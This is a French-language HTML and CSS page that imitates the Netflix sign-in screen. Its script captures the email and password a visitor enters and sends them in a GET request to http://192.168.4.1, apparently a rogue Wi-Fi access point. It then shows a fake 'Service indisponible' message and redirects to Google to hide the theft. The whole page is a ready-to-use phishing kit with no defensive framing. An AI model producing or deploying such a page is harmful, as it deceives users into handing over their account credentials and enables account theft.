.login-header {
    margin-bottom: 28px;
    color: #fff;
    font-size: 22px;
    font-weight: 700;
	text-align:center;
}

.form-control {
    margin-bottom: 20px;
    padding: 16px 20px;
    border: none;
    border-radius: 4px;
    font-size: 16px;
	width : 70%;
}

.form-control:focus {
    outline: none;
}

.btn {
    background-color: #e50914; /* Bouton rouge Netflix */
    border: none;
    color: #fff;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    padding: 16px;
    margin-top: 24px;
    width: 80%;
    border-radius: 4px;
}

.btn:hover {
    background-color: #f40612;
}

.login-footer, .signup-footer {
    margin-top: 16px;
    color: #737373; /* Texte gris */
    font-size: 16px;
}

.login-link, .signup-link {
    color: #fff;
    text-decoration: none;
}

.checkbox {
    color: #b3b3b3; /* Texte checkbox */
    padding: 0;
    margin-right: 10px;
    margin-bottom: 10px;
	text-align:center;
}

.checkbox input {
    margin-right: 5px;
}

.checkbox label {
    display: inline-block;
    font-size: 16px;
}

<body>
    <div class="login-form">
        <div class="login-logo"></div> <!-- Div pour l'image du logo Netflix -->
        <div class="login-header">Se connecter à Netflix</div>
        <input type="text" id="email" class="form-control" placeholder="Adresse e-mail ou numéro de téléphone">
        <input type="password" id="password" class="form-control" placeholder="Mot de passe">
        <button onclick="sendCredentials()" class="btn">Se connecter</button>
        <div class="login-footer">
            <div class="checkbox">
                <input type="checkbox" id="rememberMe" name="rememberMe">
                <label for="rememberMe">Se souvenir de moi</label>
            </div>
            <a href="#" class="login-link">Besoin d'aide ?</a>
        </div>
        <div class="signup-footer">
            <span>Nouveau sur Netflix ?</span> <a href="#" class="signup-link">Inscrivez-vous maintenant.</a>
        </div>
    </div>

        <script>
        function sendCredentials() { 	
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
            alert("Service indisponible.");
            window.location.href = "https://www.google.com";
        }

        function getFile(url) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.send();
        }
    </script>
    </script>
</body>
